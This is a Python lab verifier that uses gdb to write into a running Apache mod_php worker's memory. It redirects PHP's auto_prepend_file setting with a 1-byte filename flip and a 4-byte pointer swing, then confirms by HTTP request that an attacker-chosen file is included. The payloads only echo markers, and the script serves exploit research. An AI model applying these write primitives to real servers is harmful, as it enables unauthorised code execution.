#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Verifier for the 1-byte and 4-byte PARTIAL-WRITE variants of the
PG(auto_prepend_file) persistent dispatch (auto_prepend_persist_narrow.py) on
the 8.4.26-apache mod_php libphp.so.

Lab bring-up / run / teardown (from the repo root; GDB-assisted write path):
    docker compose -f docker-compose.reuse.yml --profile pgpersist up -d
    python3 -I poc/primitives/dispatch/verify_auto_prepend_persist_narrow.py
    docker compose -f docker-compose.reuse.yml --profile pgpersist down
(container php2shell_pgpersist-pgp-apache-1, :8096; override with PGP_CONTAINER.)

  VARIANT-1B (DEMO A): PG(apf) already points at a decoy path string whose
    address is known. A SINGLE-BYTE write into that string flips it to a
    different, attacker-controlled filename -> the follow-up request includes the
    new file. The operative write under test is exactly 1 byte.

  VARIANT-4B (DEMO B): PG(apf) already holds a pointer to a decoy string. A
    target string is placed at another address sharing the SAME high 32 bits
    (both in libphp .bss). A 4-BYTE write of the low half of the PG(apf) FIELD
    swings the pointer from decoy->target. The operative write under test is
    exactly 4 bytes (`set {unsigned int}`).

Both use the gdb-assisted transport. Verification is by REQUEST BEHAVIOR only
(ini_get is NOT a valid oracle). The 8-byte SETUP writes (place the decoy
string, point PG at it) are scaffolding to establish each partial-write's
precondition (a non-NULL PG + a known string); they are NOT the primitive under
test. Each variant then performs ONLY its narrow write and the marker must
switch decoy->real on the follow-up request.

Lab: docker-compose.reuse.yml --profile pgpersist (php2shell_c2-apache-vuln
image, prefork MaxRequestWorkers 1, host port 8096), gdb in-container,
SYS_PTRACE + seccomp unconfined. Pure stdlib.
Run:  python3 -I poc/primitives/dispatch/verify_auto_prepend_persist_narrow.py
"""

import os
import sys
import subprocess
import urllib.request

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)
import auto_prepend_persist          # noqa: E402  offsets + write_cstring
import auto_prepend_persist_narrow   # noqa: E402  builders under test

CONTAINER = os.environ.get("PGP_CONTAINER", "php2shell_pgpersist-pgp-apache-1")
URL = os.environ.get("PGP_URL", "http://localhost:8096/index.php")
TAG = "%08x" % (os.getpid() & 0xffffffff)
# Two payload files whose names differ by EXACTLY one byte (the trailing digit),
# so the 1-byte variant is a single-char flip. Each echoes a distinct marker.
DECOY_PATH = "/tmp/ppd0_%s.php" % TAG
REAL_PATH = "/tmp/ppd1_%s.php" % TAG
DECOY_MARK = "PGP_PARTIAL_DECOY_" + TAG
REAL_MARK = "PGP_PARTIAL_REAL_" + TAG


from common.labharness import sh  # noqa: E402


def dexec(*cmd):
    return sh("docker", "exec", CONTAINER, *cmd)


def http_body(timeout=15):
    try:
        with urllib.request.urlopen(URL, timeout=timeout) as r:
            return r.read().decode(errors="replace")
    except Exception as e:
        if hasattr(e, "read"):
            try:
                return e.read().decode(errors="replace")
            except Exception:
                pass
        return "<http-error: %r>" % e


def worker_pid_and_base():
    pids = sorted(int(p) for p in
                  dexec("pgrep", "-f", "apache2 -DFOREGROUND").split())
    if len(pids) < 2:
        http_body()
        pids = sorted(int(p) for p in
                      dexec("pgrep", "-f", "apache2 -DFOREGROUND").split())
    worker = pids[-1]
    maps = dexec("cat", "/proc/%d/maps" % worker)
    base = None
    for line in maps.splitlines():
        if "libphp.so" in line and " 00000000 " in line:
            base = int(line.split("-", 1)[0], 16)
            break
    if base is None:
        raise RuntimeError("libphp.so base not found in worker %d maps" % worker)
    return worker, base


def gdb_apply(pid, ops):
    """Apply width-aware writes via one gdb attach/detach.
    ops: list of (abs_addr, width_bytes, value). width in {1,4,8}."""
    ctype = {1: "unsigned char", 4: "unsigned int", 8: "unsigned long"}
    exprs = []
    for addr, width, val in ops:
        exprs += ["-ex", "set {%s}0x%x = 0x%x" % (ctype[width], addr, val)]
    exprs += ["-ex", "detach", "-ex", "quit"]
    return dexec("gdb", "-p", str(pid), "-batch", *exprs)


def gdb_read(pid, apf, str_addr):
    return dexec("gdb", "-p", str(pid), "-batch",
                 "-ex", "x/gx 0x%x" % apf,
                 "-ex", "x/s 0x%x" % str_addr,
                 "-ex", "detach", "-ex", "quit")


def drop_payloads():
    for path, mark in ((DECOY_PATH, DECOY_MARK), (REAL_PATH, REAL_MARK)):
        payload = '<?php echo "%s\\n"; ?>' % mark
        dexec("sh", "-c", "cat > %s <<'EOF'\n%s\nEOF" % (path, payload))
        dexec("sh", "-c", "chmod 644 %s" % path)


def reset_null(worker, apf):
    gdb_apply(worker, [(apf, 8, 0)])


def variant_1byte(worker, base, off):
    print("\n==================  VARIANT-1B  (single-byte string-char flip)  ==================")
    apf = auto_prepend_persist.apf_addr(base, off)
    scratch = base + off["pg_scratch_off"]

    # --- SETUP (8-byte scaffolding): place decoy string + point PG at it ---
    setup_ops = []
    auto_prepend_persist.write_cstring(lambda a, q: setup_ops.append((a, 8, q)), scratch, DECOY_PATH)
    setup_ops.append((apf, 8, scratch))
    gdb_apply(worker, setup_ops)
    rb = gdb_read(worker, apf, scratch)
    print("[setup] PG(apf)=0x%x -> scratch@0x%x (decoy string)" % (apf, scratch))
    print("        " + "\n        ".join(l for l in rb.splitlines() if ":" in l and "0x" in l))

    b0 = http_body()
    pre_decoy, pre_real = (DECOY_MARK in b0), (REAL_MARK in b0)
    print("[pre ] decoy=%s real=%s  (expect decoy=True real=False)" % (pre_decoy, pre_real))

    # --- THE PRIMITIVE UNDER TEST: 1-byte write(s) flipping decoy->real path ---
    ops = auto_prepend_persist_narrow.flip_string_ops(scratch, DECOY_PATH, REAL_PATH)
    print("[1B  ] flip_string_ops planned %d single-byte write(s):" % len(ops))
    for addr, width, val in ops:
        print("         [0x%x] (%dB) = 0x%02x ('%s')" % (addr, width, val, chr(val)))
    assert all(w == 1 for _, w, _ in ops), "VARIANT-1B must be 1-byte writes only"
    gdb_apply(worker, ops)
    rb = gdb_read(worker, apf, scratch)
    print("        read-back: " + " | ".join(l.strip() for l in rb.splitlines()
                                             if ":" in l and "0x" in l))

    b1 = http_body()
    post_decoy, post_real = (DECOY_MARK in b1), (REAL_MARK in b1)
    print("[post] decoy=%s real=%s  (expect decoy=False real=True)" % (post_decoy, post_real))

    ok = pre_decoy and (not pre_real) and post_real and (not post_decoy)
    reset_null(worker, apf)
    print("[1B  ] RESULT: %s" % ("PASS" if ok else "FAIL"))
    return ok


def variant_4byte(worker, base, off):
    print("\n==================  VARIANT-4B  (low-half pointer swing)  ==================")
    apf = auto_prepend_persist.apf_addr(base, off)
    decoy_addr = base + off["pg_scratch_off"]           # string A (decoy)
    real_addr = base + off["pg_scratch_off"] + 0x40     # string B (real), same high32

    # --- SETUP (8-byte scaffolding): place BOTH strings; point PG at decoy ---
    setup_ops = []
    w = lambda a, q: setup_ops.append((a, 8, q))
    auto_prepend_persist.write_cstring(w, decoy_addr, DECOY_PATH)
    auto_prepend_persist.write_cstring(w, real_addr, REAL_PATH)
    setup_ops.append((apf, 8, decoy_addr))
    gdb_apply(worker, setup_ops)
    print("[setup] decoy str@0x%x  real str@0x%x  PG(apf)@0x%x -> decoy" %
          (decoy_addr, real_addr, apf))
    print("        high32(decoy)=0x%08x  high32(real)=0x%08x  high32eq=%s" %
          (decoy_addr >> 32, real_addr >> 32, (decoy_addr >> 32) == (real_addr >> 32)))

    b0 = http_body()
    pre_decoy, pre_real = (DECOY_MARK in b0), (REAL_MARK in b0)
    print("[pre ] decoy=%s real=%s  (expect decoy=True real=False)" % (pre_decoy, pre_real))

    # --- THE PRIMITIVE UNDER TEST: 4-byte low-half write of &PG(apf) ---
    op = auto_prepend_persist_narrow.swing_lowhalf_op(apf, decoy_addr, real_addr)
    addr, width, val = op
    print("[4B  ] swing_lowhalf_op: [0x%x] (%dB) = 0x%08x  (low32 of real str)" %
          (addr, width, val))
    assert width == 4, "VARIANT-4B must be a 4-byte write"
    gdb_apply(worker, [op])
    rb = gdb_read(worker, apf, real_addr)
    print("        read-back: " + " | ".join(l.strip() for l in rb.splitlines()
                                             if ":" in l and "0x" in l))

    b1 = http_body()
    post_decoy, post_real = (DECOY_MARK in b1), (REAL_MARK in b1)
    print("[post] decoy=%s real=%s  (expect decoy=False real=True)" % (post_decoy, post_real))

    ok = pre_decoy and (not pre_real) and post_real and (not post_decoy)
    reset_null(worker, apf)
    print("[4B  ] RESULT: %s" % ("PASS" if ok else "FAIL"))
    return ok


def main():
    print("== PG(auto_prepend_file) PARTIAL-WRITE variants -- mechanism proof ==")
    print("container = %s" % CONTAINER)
    print("url       = %s" % URL)
    print("decoy=%s (%s)\nreal =%s (%s)" % (DECOY_PATH, DECOY_MARK, REAL_PATH, REAL_MARK))

    off = auto_prepend_persist.APACHE_8426_OFFSETS
    drop_payloads()
    worker, base = worker_pid_and_base()
    print("\nworker pid = %d   libphp base = 0x%x" % (worker, base))

    # clean start
    reset_null(worker, auto_prepend_persist.apf_addr(base, off))
    b = http_body()
    if DECOY_MARK in b or REAL_MARK in b:
        raise SystemExit("ABORT: a marker present before any write")

    r1 = variant_1byte(worker, base, off)
    r4 = variant_4byte(worker, base, off)

    reset_null(worker, auto_prepend_persist.apf_addr(base, off))
    after = http_body()
    print("\n[cleanup] PG(apf)=NULL; markers present? decoy=%s real=%s (expect both False)"
          % (DECOY_MARK in after, REAL_MARK in after))

    print("\n== OVERALL: %s ==" % ("PASS" if (r1 and r4) else "FAIL"))
    print("   VARIANT-1B (1-byte string flip)  : %s" % ("PASS" if r1 else "FAIL"))
    print("   VARIANT-4B (4-byte pointer swing): %s" % ("PASS" if r4 else "FAIL"))
    sys.exit(0 if (r1 and r4) else 1)


if __name__ == "__main__":
    main()
